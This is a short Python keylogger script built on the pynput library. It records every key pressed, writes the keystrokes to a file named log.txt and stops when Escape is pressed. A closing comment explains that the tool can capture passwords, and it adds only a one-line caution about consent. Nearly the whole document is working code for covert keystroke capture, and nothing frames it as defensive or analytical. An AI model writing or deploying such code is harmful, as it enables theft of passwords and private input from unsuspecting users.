import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print("Key pressed: {0}".format(key.char))
    except AttributeError:
        print("Special key pressed: {0}".format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# This code snippet is a keylogger that records the keys pressed by the user and writes them to a log file called 'log.txt'. It uses the pynput library to capture the keyboard events. The on_press function is called whenever a key is pressed, and it appends the key to the keys list and writes the keys to the log file. The on_release function is called when a key is released, and it checks if the key is the escape key (Key.esc) to stop the keylogger. The listener object is created with the on_press and on_release functions, and it starts capturing the keyboard events with the join method. The log file will contain the keys pressed by the user until the escape key is pressed to stop the keylogger. The log file can be used to track the user's keystrokes and potentially capture sensitive information such as passwords. It is important to note that keyloggers can be used for malicious purposes and violate the user's privacy. It is recommended to use keyloggers responsibly and with the user's consent.